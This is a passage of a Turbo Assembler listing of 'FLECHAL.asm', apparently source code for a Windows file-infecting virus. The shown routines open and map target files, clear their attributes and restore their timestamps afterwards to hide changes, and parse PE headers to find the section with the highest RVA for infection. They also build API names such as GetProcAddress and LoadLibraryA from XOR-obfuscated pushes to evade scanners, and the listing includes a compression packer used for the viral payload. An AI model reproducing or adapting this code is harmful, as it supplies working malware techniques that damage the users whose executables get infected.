   2136	00000F16  C2 0004		    ret	(4*1)
   2137
   2138	00000F19  FFFFFFFF		    _current_fname dd -1
   2139
   2140	00000F1D			    _poly_fields:
   2141
   2142	00000F1D  60			    pushad
   2143	00000F1E  FF 35	00002EB8r	    push l_size	;  <---temporary - it'l	be the poly loader size
   2144	00000F24  58			    pop	eax
   2145	00000F25  03 05	000061C0r	    add	eax, _viral_temp_sz
   2146	00000F2B  A3 000001BCr		    mov	_viral_pack_packet_sz, eax
   2147
   2148	00000F30  89 44	24 1C		    mov	[esp+(4*7)], eax
   2149	00000F34  61			    popad
   2150	00000F35  C3			    ret
   2151
   2152	00000F36			    _check_know_section:
   2153
   2154	00000F36  55			    push ebp
   2155	00000F37  8B EC			    mov	ebp, esp
   2156	00000F39  60			    pushad
   2157
   2158	00000F3A  8B 75	08		    mov	esi, [ebp+8]
   2159					    x_push edi,	.text~CODE~.code~DATA~.data~.rdata~.sdata~.idata~.edata~.rsrc~.reloc~.debug~
1  2160								 x_push_first edi
2  2161	00000F3D  33 FF						 xor	 edi, edi
3  2162									 x_push_next q,edi,j
4  2163	00000F3F  81 EF	FF988A9E				 sub	 edi, _reg - j
4  2164	00000F45  57						 push	 edi
3  2165									 x_push_next q,edi,j
4  2166	00000F46  81 F7	65035B62				 xor	 edi, _reg xor j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 39
FLECHAL.asm



4  2167	00000F4C  57						 push	 edi
3  2168									 x_push_next q,edi,j
4  2169	00000F4D  81 C7	FE0B3E65				 add	 edi, j	- _reg
4  2170	00000F53  57						 push	 edi
3  2171									 x_push_next q,edi,j
4  2172	00000F54  81 F7	11416C06				 xor	 edi, _reg xor j
4  2173	00000F5A  57						 push	 edi
3  2174									 x_push_next q,edi,j
4  2175	00000F5B  81 EF	FFBA8E35				 sub	 edi, _reg - j
4  2176	00000F61  57						 push	 edi
3  2177									 x_push_next q,edi,j
4  2178	00000F62  81 F7	7212064F				 xor	 edi, _reg xor j
4  2179	00000F68  57						 push	 edi
3  2180									 x_push_next q,edi,j
4  2181	00000F69  81 C7	6403B99F				 add	 edi, j	- _reg
4  2182	00000F6F  57						 push	 edi
3  2183									 x_push_next q,edi,j
4  2184	00000F70  81 F7	05114F64				 xor	 edi, _reg xor j
4  2185	00000F76  57						 push	 edi
3  2186									 x_push_next q,edi,j
4  2187	00000F77  81 EF	F8466103				 sub	 edi, _reg - j
4  2188	00000F7D  57						 push	 edi
3  2189									 x_push_next q,edi,j
4  2190	00000F7E  81 F7	1D4F6412				 xor	 edi, _reg xor j
4  2191	00000F84  57						 push	 edi
3  2192									 x_push_next q,edi,j
4  2193	00000F85  81 C7	B99EFD01				 add	 edi, j	- _reg
4  2194	00000F8B  57						 push	 edi
3  2195									 x_push_next q,edi,j
4  2196	00000F8C  81 F7	4F64135A				 xor	 edi, _reg xor j
4  2197	00000F92  57						 push	 edi
3  2198									 x_push_next q,edi,j
4  2199	00000F93  81 EF	6102FDCD				 sub	 edi, _reg - j
4  2200	00000F99  57						 push	 edi
3  2201									 x_push_next q,edi,j
4  2202	00000F9A  81 F7	644F7420				 xor	 edi, _reg xor j
4  2203	00000FA0  57						 push	 edi
3  2204									 x_push_next q,edi,j
4  2205	00000FA1  81 C7	F01343BF				 add	 edi, j	- _reg
4  2206	00000FA7  57						 push	 edi
3  2207									 x_push_next q,edi,j
4  2208	00000FA8  81 F7	31252B63				 xor	 edi, _reg xor j
4  2209	00000FAE  57						 push	 edi
3  2210									 x_push_next q,edi,j
4  2211	00000FAF  81 EF	37642A1F				 sub	 edi, _reg - j
4  2212	00000FB5  57						 push	 edi
3  2213									 x_push_next q,edi,j
4  2214	00000FB6  81 F7	61434530				 xor	 edi, _reg xor j
4  2215	00000FBC  57						 push	 edi
3  2216									 x_push_next q,edi,j
4  2217	00000FBD  81 C7	292273BA				 add	 edi, j	- _reg
4  2218	00000FC3  57						 push	 edi
1  2219	00000FC4  8B FC						 mov edi, esp
   2220	00000FC6  B9 0000000C		    mov	ecx, 12
   2221
   2222	00000FCB			    cmp_section:
   2223
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 40
FLECHAL.asm



   2224	00000FCB  51			    push ecx
   2225	00000FCC  57			    push edi
   2226	00000FCD  56			    push esi
   2227					    callx lstrcmpi
1  2228	00000FCE  E8 00000000e		    call lstrcmpi
   2229
   2230	00000FD3  50			    push eax
   2231	00000FD4  57			    push edi
   2232					    callx lstrlen
1  2233	00000FD5  E8 00000000e		    call lstrlen
   2234
   2235	00000FDA  40			    inc	eax
   2236	00000FDB  03 F8			    add	edi, eax
   2237	00000FDD  58			    pop	eax
   2238	00000FDE  59			    pop	ecx
   2239
   2240	00000FDF  85 C0			    test eax, eax
   2241	00000FE1  74 07			    jz end_cmp_section
   2242
   2243	00000FE3  E2 E6			    loop cmp_section
   2244
   2245	00000FE5  B8 FFFFFFFF		    mov	eax, -1
   2246
   2247	00000FEA			    end_cmp_section:  ;	 00401d05
   2248
   2249	00000FEA  60			    pushad
   2250	00000FEB  85 C0			    test eax, eax
   2251	00000FED  75 0C			    jnz	.64
   2252	00000FEF  6A 00	56 56 6A 00	    push 0 esi esi 0
   2253	00000FF5  FF 15	00002EBCr	    call [MessageBoxA]
   2254	00000FFB			    .64:
   2255	00000FFB  61			    popad
   2256
   2257					    x_pop
1  2258	00000FFC  8D 64	24 4C					 lea	 esp, [esp + _xsize]
   2259	00001000  85 C0			    test eax, eax
   2260	00001002  61			    popad
   2261	00001003  5D			    pop	ebp
   2262	00001004  C2 0004		    ret	(4*1)
   2263
   2264	00001007			    _cmp_1:
   2265
   2266	00001007  8B 45	00		    mov	eax, [ebp]
   2267
   2268	0000100A  51			    push ecx
   2269	0000100B  50			    push eax
   2270	0000100C  E8 0000004F		    call _rva_to_va
   2271	00001011  59			    pop	ecx
   2272
   2273	00001012  85 C0			    test eax, eax
   2274	00001014  74 49			    jz _cmp_ret
   2275
   2276	00001016  83 C0	02		    add	eax, 2
   2277
   2278					    ;  EAX points to the first imported	function
   2279
   2280	00001019  51			    push ecx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 41
FLECHAL.asm



   2281	0000101A  50			    push eax
   2282	0000101B  FF 35	000001B0r	    push _look_4_function
   2283					    callx lstrcmp
1  2284	00001021  E8 00000000e		    call lstrcmp
   2285	00001026  59			    pop	ecx
   2286
   2287	00001027  83 C5	04		    add	ebp, 4
   2288	0000102A  41			    inc	ecx
   2289
   2290	0000102B  85 C0			    test eax, eax
   2291	0000102D  75 D8			    jnz	_cmp_1
   2292
   2293	0000102F  60			    pushad
   2294	00001030  6A 00			    push 0
   2295	00001032  FF 35	000001B0r	    push _look_4_function
   2296	00001038  FF 35	000001B0r	    push _look_4_function
   2297	0000103E  6A 00			    push 0
   2298	00001040  FF 15	00002EBCr	    call [MessageBoxA]
   2299	00001046  61			    popad
   2300
   2301	00001047  49			    dec	ecx
   2302
   2303	00001048  A1 000001B8r		    mov	eax, _import_function
   2304	0000104D  8D 0C	8D 00000000	    lea	ecx, [ecx*4]
   2305	00001054  03 C1			    add	eax, ecx
   2306	00001056  8B 0D	00000164r	    mov	ecx, _image_nt_headers
   2307	0000105C  03 41	34		    add	eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
   2308
   2309					    ;  Runtime address of function in [EAX]
   2310
   2311	0000105F			    _cmp_ret:
   2312
   2313	0000105F  C3			    ret
   2314
   2315	00001060			    _rva_to_va:
   2316
   2317	00001060  55			    push ebp
   2318	00001061  8B EC			    mov	ebp, esp
   2319	00001063  60			    pushad
   2320
   2321	00001064  8B 45	08		    mov	eax, [ebp+8]
   2322
   2323	00001067  6A 00			    push NULL
   2324	00001069  50			    push eax
   2325	0000106A  57			    push edi
   2326	0000106B  FF 35	00000164r	    push _image_nt_headers
   2327	00001071  FF 15	00000160r	    call ImageRvaToVa
   2328
   2329	00001077  89 44	24 1C		    mov	[esp+(4*7)], eax
   2330	0000107B  61			    popad
   2331	0000107C  5D			    pop	ebp
   2332	0000107D  C2 0004		    ret	(1*4)
   2333
   2334	00001080			    _re_size:
   2335
   2336	00001080  50			    push eax
   2337	00001081  FF 35	00000F19r	    push _current_fname
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 42
FLECHAL.asm



   2338	00001087  E8 000001EF		    call _close_file
   2339
   2340	0000108C  FF 35	00000F19r	    push _current_fname
   2341	00001092  E8 000000BD		    call _open_write
   2342
   2343	00001097  8B F8			    mov	edi, eax
   2344	00001099  58			    pop	eax
   2345	0000109A  C3			    ret
   2346
   2347	0000109B			    _re_align:
   2348
   2349					    ;  _re_align (alignment, value)
   2350
   2351	0000109B  51			    push ecx
   2352	0000109C  52			    push edx
   2353
   2354	0000109D  8B 44	24 10		    mov	eax, [esp+16]
   2355	000010A1  2B D2			    sub	edx, edx
   2356	000010A3  03 05	000001BCr	    add	eax, _viral_pack_packet_sz
   2357	000010A9  8B 4C	24 0C		    mov	ecx, [esp+12]
   2358	000010AD  F7 F1			    div	ecx
   2359	000010AF  40			    inc	eax
   2360	000010B0  2B D2			    sub	edx, edx
   2361	000010B2  F7 E1			    mul	ecx
   2362
   2363	000010B4  5A			    pop	edx
   2364	000010B5  59			    pop	ecx
   2365	000010B6  C2 0008		    ret	(4*2)
   2366
   2367	000010B9			    _biggest_rva:
   2368
   2369					    ;  return pointer to section with the biggest
   2370					    ;  RVA
   2371
   2372	000010B9  55			    push ebp
   2373	000010BA  8B EC			    mov	ebp, esp
   2374	000010BC  60			    pushad
   2375
   2376	000010BD  2B C0			    sub	eax, eax
   2377	000010BF  8B 3D	00000164r	    mov	edi, _image_nt_headers
   2378	000010C5  0F B7	4F 06		    movzx ecx, [edi.IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
   2379	000010C9  E3 20			    jecxz _biggest_rva_end
   2380	000010CB  8D BF	000000F8	    lea	edi, [edi+SIZE IMAGE_NT_HEADERS]
   2381
   2382	000010D1			    _rva_loop:
   2383
   2384	000010D1  3B 47	0C		    cmp	eax, [edi.SH_VirtualAddress]
   2385	000010D4  77 03			    ja _rva_loop_1
   2386	000010D6  8B 47	0C		    mov	eax, [edi.SH_VirtualAddress]
   2387
   2388	000010D9			    _rva_loop_1:
   2389
   2390	000010D9  83 C7	28		    add	edi, SIZE IMAGE_SECTION_HEADER
   2391	000010DC  49			    dec	ecx
   2392	000010DD  85 C9			    test ecx, ecx
   2393	000010DF  74 0A			    jz _biggest_rva_end
   2394	000010E1  8B 57	0C		    mov	edx, [edi.SH_VirtualAddress]
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 43
FLECHAL.asm



   2395	000010E4  3B C2			    cmp	eax, edx
   2396	000010E6  77 E9			    ja _rva_loop
   2397	000010E8  92			    xchg eax, edx
   2398	000010E9  EB E6			    jmp	_rva_loop
   2399
   2400	000010EB			    _biggest_rva_end:
   2401
   2402	000010EB  A3 00000184r		    mov	_infect_biggest_rva, eax
   2403	000010F0  89 44	24 1C		    mov	[esp+(4*7)], eax
   2404	000010F4  85 C0			    test eax, eax
   2405	000010F6  61			    popad
   2406	000010F7  5D			    pop	ebp
   2407	000010F8  C3			    ret
   2408
   2409	000010F9			    _open_read:
   2410
   2411	000010F9  2B C0			    sub	eax, eax
   2412	000010FB  A3 0000013Cr		    mov	_file_size, eax
   2413	00001100  C7 05	00000118r     +	    mov	_create_flag, OPEN_EXISTING
   2414		  00000003
   2415	0000110A  C7 05	00000120r     +	    mov	_access_type, GENERIC_READ
   2416		  80000000
   2417	00001114  C7 05	00000140r     +	    mov	_map_access_type, PAGE_READONLY
   2418		  00000002
   2419	0000111E  C7 05	00000144r     +	    mov	_mview_access_type, FILE_MAP_READ
   2420		  00000004
   2421	00001128  EB 59			    jmp	short _open
   2422
   2423	0000112A			    _open_create:
   2424
   2425	0000112A  C7 05	00000118r     +	    mov	_create_flag, CREATE_ALWAYS
   2426		  00000002
   2427	00001134  C7 05	00000120r     +	    mov	_access_type, GENERIC_READ or GENERIC_WRITE
   2428		  C0000000
   2429	0000113E  C7 05	00000140r     +	    mov	_map_access_type, PAGE_READWRITE
   2430		  00000004
   2431	00001148  C7 05	00000144r     +	    mov	_mview_access_type, FILE_MAP_WRITE
   2432		  00000002
   2433	00001152  EB 2F			    jmp	short _open
   2434
   2435	00001154			    _open_write:
   2436
   2437	00001154  2B C0			    sub	eax, eax
   2438	00001156  A3 0000013Cr		    mov	_file_size, eax
   2439	0000115B  C7 05	00000118r     +	    mov	_create_flag, OPEN_EXISTING
   2440		  00000003
   2441	00001165  C7 05	00000120r     +	    mov	_access_type, GENERIC_READ or GENERIC_WRITE
   2442		  C0000000
   2443	0000116F  C7 05	00000140r     +	    mov	_map_access_type, PAGE_READWRITE
   2444		  00000004
   2445	00001179  C7 05	00000144r     +	    mov	_mview_access_type, FILE_MAP_WRITE
   2446		  00000002
   2447
   2448	00001183			    _open:
   2449
   2450	00001183  55			    push ebp
   2451	00001184  8B EC			    mov	ebp, esp
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 44
FLECHAL.asm



   2452	00001186  60			    pushad
   2453
   2454	00001187  C7 05	0000011Cr     +	    mov	_file_attrib, FILE_ATTRIBUTE_NORMAL
   2455		  00000080
   2456	00001191  8B 75	08		    mov	esi, [ebp+8]
   2457
   2458	00001194  56			    push esi
   2459					    callx GetFileAttributesA
1  2460	00001195  E8 00000000e		    call GetFileAttributesA
   2461
   2462	0000119A  40			    inc	eax
   2463	0000119B  74 1A			    jz _set_normal
   2464	0000119D  48			    dec	eax
   2465	0000119E  A3 0000011Cr		    mov	_file_attrib, eax
   2466
   2467	000011A3  83 E8	10		    sub	eax, FILE_ATTRIBUTE_DIRECTORY
   2468	000011A6  0F 84	000000C6	    jz _io_end
   2469
   2470	000011AC  2D 000007F0		    sub	eax, FILE_ATTRIBUTE_COMPRESSED - FILE_ATTRIBUTE_DIRECTORY
   2471	000011B1  0F 84	000000BB	    jz _io_end
   2472
   2473	000011B7			    _set_normal:
   2474
   2475	000011B7  68 00000080		    push FILE_ATTRIBUTE_NORMAL
   2476	000011BC  56			    push esi
   2477					    callx SetFileAttributesA
1  2478	000011BD  E8 00000000e		    call SetFileAttributesA
   2479
   2480	000011C2  6A 00			    push 0
   2481	000011C4  6A 00			    push 0
   2482	000011C6  FF 35	00000118r	    push _create_flag
   2483	000011CC  6A 00			    push 0
   2484	000011CE  6A 01			    push FILE_SHARE_READ
   2485	000011D0  FF 35	00000120r	    push _access_type
   2486	000011D6  56			    push esi
   2487					    callx CreateFileA
1  2488	000011D7  E8 00000000e		    call CreateFileA
   2489
   2490	000011DC  A3 00000148r		    mov	hWnd_CreateFile, eax
   2491
   2492	000011E1  40			    inc	eax
   2493	000011E2  0F 84	000000F5	    jz _close_1
   2494
   2495	000011E8  B8 00000124r		    mov	eax, offset _file_time
   2496	000011ED  50			    push eax
   2497	000011EE  83 E8	F8		    sub	eax, - 8
   2498	000011F1  50			    push eax
   2499	000011F2  83 C0	08		    add	eax, 8
   2500	000011F5  50			    push eax
   2501	000011F6  FF 35	00000148r	    push hWnd_CreateFile
   2502					    callx GetFileTime
1  2503	000011FC  E8 00000000e		    call GetFileTime
   2504
   2505	00001201  48			    dec	eax
   2506	00001202  0F 85	000000CA	    jnz	_close_2
   2507
   2508	00001208  83 3D	00000118r 02	    cmp	_create_flag, CREATE_ALWAYS
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 45
FLECHAL.asm



   2509	0000120F  74 18			    je _map
   2510
   2511	00001211  50			    push eax
   2512	00001212  FF 35	00000148r	    push hWnd_CreateFile
   2513					    callx GetFileSize
1  2514	00001218  E8 00000000e		    call GetFileSize
   2515
   2516	0000121D  A3 0000013Cr		    mov	_file_size, eax
   2517
   2518	00001222  40			    inc	eax
   2519	00001223  0F 84	00000090	    jz _close_3
   2520
   2521	00001229			    _map:
   2522
   2523	00001229  2B C0			    sub	eax, eax
   2524
   2525	0000122B  50			    push eax
   2526	0000122C  FF 35	0000013Cr	    push _file_size
   2527	00001232  50			    push eax
   2528	00001233  FF 35	00000140r	    push _map_access_type
   2529	00001239  50			    push eax
   2530	0000123A  FF 35	00000148r	    push hWnd_CreateFile
   2531					    callx CreateFileMappingA
1  2532	00001240  E8 00000000e		    call CreateFileMappingA
   2533
   2534	00001245  A3 0000014Cr		    mov	hWnd_CreateFileMapping,	eax
   2535
   2536	0000124A  85 C0			    test eax, eax
   2537	0000124C  74 6B			    jz _close_3
   2538
   2539	0000124E  2B C0			    sub	eax, eax
   2540
   2541	00001250  FF 35	0000013Cr	    push _file_size
   2542	00001256  50			    push eax
   2543	00001257  50			    push eax
   2544	00001258  FF 35	00000144r	    push _mview_access_type
   2545	0000125E  FF 35	0000014Cr	    push hWnd_CreateFileMapping
   2546					    callx MapViewOfFile
1  2547	00001264  E8 00000000e		    call MapViewOfFile
   2548
   2549	00001269  A3 00000150r		    mov	hWnd_MapViewOfFile, eax
   2550
   2551	0000126E  85 C0			    test eax, eax
   2552	00001270  74 1B			    jz _close_4
   2553
   2554	00001272			    _io_end:
   2555
   2556	00001272  89 44	24 1C		    mov	[esp+(4*7)], eax
   2557	00001276  61			    popad
   2558	00001277  5D			    pop	ebp
   2559	00001278  C2 0004		    ret	(1*4)
   2560
   2561	0000127B			    _close_file:
   2562
   2563	0000127B  55			    push ebp
   2564	0000127C  8B EC			    mov	ebp, esp
   2565	0000127E  60			    pushad
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 46
FLECHAL.asm



   2566
   2567	0000127F  8B 75	08		    mov	esi, [ebp+8]
   2568
   2569	00001282  FF 35	00000150r	    push hWnd_MapViewOfFile
   2570					    callx UnmapViewOfFile
1  2571	00001288  E8 00000000e		    call UnmapViewOfFile
   2572
   2573	0000128D			    _close_4:
   2574
   2575	0000128D  FF 35	0000014Cr	    push hWnd_CreateFileMapping
   2576					    callx CloseHandle
1  2577	00001293  E8 00000000e		    call CloseHandle
   2578
   2579	00001298  2B C0			    sub	eax, eax
   2580
   2581	0000129A  6A 00			    push FILE_BEGIN
   2582	0000129C  50			    push eax
   2583	0000129D  FF 35	0000013Cr	    push _file_size
   2584	000012A3  FF 35	00000148r	    push hWnd_CreateFile
   2585					    callx SetFilePointer
1  2586	000012A9  E8 00000000e		    call SetFilePointer
   2587
   2588	000012AE  FF 35	00000148r	    push hWnd_CreateFile
   2589					    callx SetEndOfFile
1  2590	000012B4  E8 00000000e		    call SetEndOfFile
   2591
   2592	000012B9			    _close_3:
   2593
   2594	000012B9  B8 00000124r		    mov	eax, offset _file_time
   2595	000012BE  50			    push eax
   2596	000012BF  83 C0	08		    add	eax, 8
   2597	000012C2  50			    push eax
   2598	000012C3  83 E8	F8		    sub	eax, - 8
   2599	000012C6  50			    push eax
   2600	000012C7  FF 35	00000148r	    push hWnd_CreateFile
   2601					    callx SetFileTime
1  2602	000012CD  E8 00000000e		    call SetFileTime
   2603
   2604	000012D2			    _close_2:
   2605
   2606	000012D2  FF 35	00000148r	    push hWnd_CreateFile
   2607					    callx CloseHandle
1  2608	000012D8  E8 00000000e		    call CloseHandle
   2609
   2610	000012DD			    _close_1:
   2611
   2612	000012DD  FF 35	0000011Cr	    push _file_attrib
   2613	000012E3  56			    push esi
   2614					    callx SetFileAttributesA
1  2615	000012E4  E8 00000000e		    call SetFileAttributesA
   2616
   2617	000012E9  2B C0			    sub	eax, eax
   2618	000012EB  EB 85			    jmp	_io_end
   2619
   2620	000012ED			    locate_import:
   2621
   2622	000012ED  60			    pushad
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 47
FLECHAL.asm



   2623	000012EE  8B 0D	00000164r	    mov	ecx, _image_nt_headers
   2624	000012F4  8B 81	00000080	    mov	eax, [ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
   2625					    .(SIZE IMAGE_DATA_DIRECTORY*IMAGE_DIRECTORY_ENTRY_IMPORT)\
   2626					    .VirtualAddress]
   2627
   2628	000012FA  A3 00000174r		    mov	_infect_import_dir_rva,	eax
   2629
   2630	000012FF  50			    push eax
   2631	00001300  E8 FFFFFD5B		    call _rva_to_va
   2632
   2633	00001305  85 C0			    test eax, eax
   2634	00001307  0F 84	00000126	    jz end_locate_import
   2635
   2636	0000130D  8B F0			    mov	esi, eax
   2637
   2638	0000130F			    _find_kernel:
   2639
   2640	0000130F  FF 76	0C		    push [esi.Name1]
   2641	00001312  E8 FFFFFD49		    call _rva_to_va
   2642
   2643	00001317  85 C0			    test eax, eax
   2644	00001319  0F 84	00000114	    jz end_locate_import
   2645
   2646	0000131F  83 C6	14		    add	esi, SIZE IMAGE_IMPORT_DESCRIPTOR
   2647
   2648	00001322  B9 B1ADBAB4		    mov	ecx, not 'NREK'
   2649	00001327  F7 D1			    not	ecx
   2650
   2651	00001329  39 08			    cmp	[eax], ecx
   2652	0000132B  75 E2			    jne	_find_kernel
   2653
   2654	0000132D  83 EE	14		    sub	esi, SIZE IMAGE_IMPORT_DESCRIPTOR
   2655
   2656	00001330  8B CE			    mov	ecx, esi
   2657	00001332  2B CF			    sub	ecx, edi
   2658
   2659	00001334  89 0D	000001B4r	    mov	_kernel_import_va, ecx
   2660
   2661	0000133A  8B 46	10		    mov	eax, [esi.FirstThunk]
   2662	0000133D  A3 000001B8r		    mov	_import_function, eax
   2663
   2664	00001342  85 C0			    test eax, eax
   2665	00001344  0F 84	000000E9	    jz end_locate_import
   2666
   2667	0000134A  8B 06			    mov	eax, [esi.OriginalFirstThunk]
   2668
   2669	0000134C  50			    push eax
   2670	0000134D  E8 FFFFFD0E		    call _rva_to_va
   2671
   2672	00001352  50			    push eax
   2673	00001353  FF 30			    push dword ptr [eax]
   2674	00001355  E8 FFFFFD06		    call _rva_to_va
   2675	0000135A  85 C0			    test eax, eax
   2676	0000135C  58			    pop	eax
   2677	0000135D  74 04			    jz _find_function_1
   2678
   2679	0000135F  85 C0			    test eax, eax
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 48
FLECHAL.asm



   2680	00001361  75 27			    jnz	_find_function
   2681
   2682	00001363			    _find_function_1:
   2683
   2684	00001363  8B 46	10		    mov	eax, [esi.FirstThunk]
   2685	00001366  A3 000001B8r		    mov	_import_function, eax
   2686
   2687	0000136B  50			    push eax
   2688	0000136C  E8 FFFFFCEF		    call _rva_to_va
   2689
   2690	00001371  50			    push eax
   2691	00001372  FF 30			    push dword ptr [eax]
   2692	00001374  E8 FFFFFCE7		    call _rva_to_va
   2693	00001379  85 C0			    test eax, eax
   2694	0000137B  58			    pop	eax
   2695	0000137C  0F 84	000000B1	    jz end_locate_import
   2696
   2697	00001382  85 C0			    test eax, eax
   2698	00001384  0F 84	000000A9	    jz end_locate_import
   2699
   2700	0000138A			    _find_function:
   2701
   2702	0000138A  8B E8			    mov	ebp, eax
   2703
   2704	0000138C  55			    push ebp
   2705	0000138D  2B C9			    sub	ecx, ecx
   2706					    x_push eax,	GetProcAddress~
1  2707								 x_push_first eax
2  2708	0000138F  33 C0						 xor	 eax, eax
3  2709									 x_push_next q,eax,j
4  2710	00001391  2D 87FF8C8D					 sub	 eax, _reg - j
4  2711	00001396  50						 push	 eax
3  2712									 x_push_next q,eax,j
4  2713	00001397  35 1D721717					 xor	 eax, _reg xor j
4  2714	0000139C  50						 push	 eax
3  2715									 x_push_next q,eax,j
4  2716	0000139D  05 DBF10B0E					 add	 eax, j	- _reg
4  2717	000013A2  50						 push	 eax
3  2718									 x_push_next q,eax,j
4  2719	000013A3  35 11170A35					 xor	 eax, _reg xor j
4  2720	000013A8  50						 push	 eax
1  2721	000013A9  8B C4						 mov eax, esp
   2722	000013AB  A3 000001B0r		    mov	_look_4_function, eax
   2723	000013B0  E8 FFFFFC52		    call _cmp_1
   2724					    x_pop
1  2725	000013B5  8D 64	24 10					 lea	 esp, [esp + _xsize]
   2726	000013B9  5D			    pop	ebp
   2727	000013BA  A3 00002AECr		    mov	_import_GetProcAddress,	eax
   2728	000013BF  85 C0			    test eax, eax
   2729	000013C1  74 70			    jz end_locate_import
   2730
   2731	000013C3  55			    push ebp
   2732	000013C4  2B C9			    sub	ecx, ecx
   2733					    x_push eax,	GetModuleHandleA~
1  2734								 x_push_first eax
2  2735	000013C6  33 C0						 xor	 eax, eax
3  2736									 x_push_next q,eax,j
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 49
FLECHAL.asm



4  2737	000013C8  2D 87868600					 sub	 eax, _reg - j
4  2738	000013CD  50						 push	 eax
3  2739									 x_push_next q,eax,j
4  2740	000013CE  35 391C1664					 xor	 eax, _reg xor j
4  2741	000013D3  50						 push	 eax
3  2742									 x_push_next q,eax,j
4  2743	000013D4  05 2CFBDC01					 add	 eax, j	- _reg
4  2744	000013D9  50						 push	 eax
3  2745									 x_push_next q,eax,j
4  2746	000013DA  35 02142C0A					 xor	 eax, _reg xor j
4  2747	000013DF  50						 push	 eax
3  2748									 x_push_next q,eax,j
4  2749	000013E0  2D 1F00FF28					 sub	 eax, _reg - j
4  2750	000013E5  50						 push	 eax
1  2751	000013E6  8B C4						 mov eax, esp
   2752	000013E8  A3 000001B0r		    mov	_look_4_function, eax
   2753	000013ED  E8 FFFFFC15		    call _cmp_1
   2754					    x_pop
1  2755	000013F2  8D 64	24 14					 lea	 esp, [esp + _xsize]
   2756	000013F6  5D			    pop	ebp
   2757	000013F7  A3 000029D2r		    mov	_import_GetKernel, eax
   2758	000013FC  85 C0			    test eax, eax
   2759	000013FE  75 33			    jnz	end_locate_import
   2760
   2761	00001400  55			    push ebp
   2762	00001401  2B C9			    sub	ecx, ecx
   2763					    x_push eax,	LoadLibraryA~
1  2764								 x_push_first eax
2  2765	00001403  33 C0						 xor	 eax, eax
3  2766									 x_push_next q,eax,j
4  2767	00001405  2D 87868600					 sub	 eax, _reg - j
4  2768	0000140A  50						 push	 eax
3  2769									 x_push_next q,eax,j
4  2770	0000140B  35 39000861					 xor	 eax, _reg xor j
4  2771	00001410  50						 push	 eax
3  2772									 x_push_next q,eax,j
4  2773	00001411  05 30E8F6EB					 add	 eax, j	- _reg
4  2774	00001416  50						 push	 eax
3  2775									 x_push_next q,eax,j
4  2776	00001417  35 16030600					 xor	 eax, _reg xor j
4  2777	0000141C  50						 push	 eax
1  2778	0000141D  8B C4						 mov eax, esp
   2779	0000141F  A3 000001B0r		    mov	_look_4_function, eax
   2780	00001424  E8 FFFFFBDE		    call _cmp_1
   2781					    x_pop
1  2782	00001429  8D 64	24 10					 lea	 esp, [esp + _xsize]
   2783	0000142D  5D			    pop	ebp
   2784	0000142E  A3 000029D2r		    mov	_import_GetKernel, eax
   2785
   2786	00001433			    end_locate_import:
   2787
   2788	00001433  89 44	24 1C		    mov	[esp+(4*7)], eax
   2789	00001437  61			    popad
   2790	00001438  C3			    ret
   2791
   2792					    include PACKER.INC
1  2793	00001439			 _ap_pack:
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 50
FLECHAL.asm



1  2794
1  2795	00001439  53			 push ebx
1  2796	0000143A  56			 push esi
1  2797	0000143B  57			 push edi
1  2798	0000143C  55			 push ebp
1  2799	0000143D  83 EC	34		 sub esp, 00000034h
1  2800	00001440  8B 5C	24 54		 mov ebx, dword	ptr [esp+54h]
1  2801	00001444  8B 54	24 48		 mov edx, dword	ptr [esp+48h]
1  2802	00001448  85 D2			 test edx, edx
1  2803	0000144A  0F 84	00001516	 je aplib@001	;   0.0402670
1  2804	00001450  E9 00000B76		 jmp aplib@262
1  2805
1  2806	00001455			 aplib@029:
1  2807
1  2808	00001455  51			 push ecx
1  2809	00001456  56			 push esi
1  2810	00001457  57			 push edi
1  2811	00001458  55			 push ebp
1  2812	00001459  83 EC	04		 sub esp, 00000004
1  2813	0000145C  8B C8			 mov ecx, eax
1  2814	0000145E  89 14	24		 mov dword ptr [esp], edx
1  2815	00001461  8B EB			 mov ebp, ebx
1  2816	00001463  33 FF			 xor edi, edi
1  2817	00001465  83 FA	0F		 cmp edx, 0000000Fh
1  2818	00001468  77 34			 ja aplib@094	;   0.040116E
1  2819
1  2820	0000146A			 aplib@095:
1  2821
1  2822	0000146A  33 C0			 xor eax, eax
1  2823	0000146C  8A 01			 mov al, byte ptr [ecx]
1  2824	0000146E  85 C0			 test eax, eax
1  2825	00001470  74 35			 je aplib@096	;   0.0401177
1  2826	00001472  8B 14	24		 mov edx, dword	ptr [esp]
1  2827	00001475  8B C2			 mov eax, edx
1  2828	00001477  F7 D8			 neg eax
1  2829	00001479  8B F1			 mov esi, ecx
1  2830	0000147B  03 C1			 add eax, ecx
1  2831
1  2832	0000147D			 aplib@111:
1  2833
1  2834	0000147D  8A 19			 mov bl, byte ptr [ecx]
1  2835	0000147F  3A 18			 cmp bl, byte ptr [eax]
1  2836	00001481  74 06			 je aplib@112	;   0.0401159
1  2837	00001483  40			 inc eax
1  2838	00001484  4A			 dec edx
1  2839	00001485  3B C6			 cmp eax, esi
1  2840	00001487  75 F4			 jne aplib@111	 ;   0.040114D
1  2841
1  2842	00001489			 aplib@112:
1  2843
1  2844	00001489  83 C7	07		 add edi, 00000007
1  2845	0000148C  85 D2			 test edx, edx
1  2846	0000148E  74 1C			 je aplib@113	;   0.040117C
1  2847
1  2848	00001490			 aplib@097:
1  2849
1  2850	00001490  41			 inc ecx
Turbo Assembler	 Version 5.0	    06-15-01 01:58:05	    Page 51
FLECHAL.asm



1  2851	00001491  4D			 dec ebp
1  2852	00001492  75 D6			 jne aplib@095
1  2853	00001494  8B C7			 mov eax, edi
1  2854	00001496  83 C4	04		 add esp, 00000004
1  2855	00001499  5D			 pop ebp
1  2856	0000149A  5F			 pop edi
1  2857	0000149B  5E			 pop esi
